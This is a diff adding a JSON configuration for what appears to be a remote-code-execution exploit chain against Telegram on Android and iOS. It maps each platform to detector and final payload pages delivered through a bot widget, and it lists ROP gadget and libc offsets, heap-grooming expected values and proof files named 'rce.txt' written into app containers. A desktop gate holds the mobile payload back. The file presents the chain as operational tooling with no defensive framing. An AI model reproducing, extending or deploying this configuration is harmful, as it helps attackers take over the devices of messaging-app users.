@@ -1,0 +1,118 @@
+{
+ "1": {
+  "name": "android_route2",
+  "platform": 1,
+  "chain": 1,
+  "detector": "detector.html",
+  "final": "final_inline.html",
+  "fallback": "final_fallback.html",
+  "delivery": "bot_sendwidget",
+  "proof": {
+   "release": "/data/data/org.telegram.messenger/files/n1",
+   "beta": "/data/data/org.telegram.messenger.beta/files/n1"
+  },
+  "detector_mode": "self_report"
+ },
+ "2": {
+  "name": "ios15_holes",
+  "platform": 2,
+  "chain": 3,
+  "detector": "ios15_gated/at_probe_h400.html",
+  "probes": {
+   "400": "ios15_gated/at_probe_h400.html",
+   "200": "ios15_gated/at_probe_h200.html",
+   "500": "ios15_gated/at_probe_h500.html",
+   "64": "ios15_gated/at_probe_h64.html"
+  },
+  "finals": {
+   "400": "ios15_gated/at_final_h400.html",
+   "200": "ios15_gated/at_final_h200.html",
+   "500": "ios15_gated/at_final_h500.html",
+   "64": "ios15_gated/at_final_h64.html"
+  },
+  "h_order": [
+   400,
+   200,
+   64,
+   500
+  ],
+  "proof_path": "/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt",
+  "gadgets": {
+   "G_CALL": "base+0x3292c",
+   "G_LOAD": "base+0x172d96c",
+   "G_X0": "base+0x628a2c",
+   "PIVOT2": "libcFree-0x66cccfc"
+  },
+  "delivery": "bot_sendwidget",
+  "detector_mode": "marker_relay",
+  "expected": {
+   "H": 400,
+   "HIT": 545,
+   "LEN": 327744,
+   "PH": 36,
+   "VK": 598,
+   "NT": 21,
+   "N": 3000
+  }
+ },
+ "3": {
+  "name": "ios27_parser",
+  "platform": 3,
+  "chain": 4,
+  "detector": "ios27_gated/detector_ios27.html",
+  "detector_mode": "safe_handshake",
+  "final": "ios27_gated/final_ios27.html",
+  "finals_by_m": {
+   "128": "ios27_gated/final_ios27_m128.html",
+   "256": "ios27_gated/final_ios27_m256.html",
+   "384": "ios27_gated/final_ios27_m384.html",
+   "512": "ios27_gated/final_ios27_m512.html",
+   "640": "ios27_gated/final_ios27_m640.html",
+   "768": "ios27_gated/final_ios27_m768.html",
+   "896": "ios27_gated/final_ios27_m896.html",
+   "1024": "ios27_gated/final_ios27_m1024.html",
+   "1280": "ios27_gated/final_ios27_m1280.html",
+   "1536": "ios27_gated/final_ios27_m1536.html",
+   "1792": "ios27_gated/final_ios27_m1792.html",
+   "2048": "ios27_gated/final_ios27_m2048.html",
+   "2560": "ios27_gated/final_ios27_m2560.html",
+   "3072": "ios27_gated/final_ios27_m3072.html"
+  },
+  "fallback": "ios27_gated/final_ios27.html",
+  "fallback_note": "safe miss: re-send the final after the 3 s cooldown (new heap); the final itself is a safe miss",
+  "delivery": "bot_sendwidget",
+  "proof_path": "/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt",
+  "appgroup": "00000000-0000-0000-0000-000000000000",
+  "stageB": {
+   "n": "0x3f4f174",
+   "f": "0x557bc20",
+   "pivot": "libcFree+0xB6583074",
+   "open": "libcFree+0xB79B52BC",
+   "write": "libcFree+0xB79B3B8C",
+   "pexit": "libcFree-0x88AC"
+  },
+  "expected": {
+   "HIT": 545,
+   "VK": 598,
+   "PH": 12,
+   "M": 768,
+   "N": 2600,
+   "SZ": 957,
+   "UBn": 24,
+   "UBsz": 576,
+   "LEN": 327744
+  },
+  "payload_sha256": "bf31f2f66485174d086d520cbbf8f0434eed674c7282c0a87d731d46015248f8"
+ },
+ "9": {
+  "name": "desktop",
+  "platform": 9,
+  "chain": 0,
+  "detector": "",
+  "final": null,
+  "fallback": null,
+  "delivery": "none",
+  "action": "do_not_send_final",
+  "note": "early gate fired (DESKTOP OK); never send a mobile final"
+ }
+}
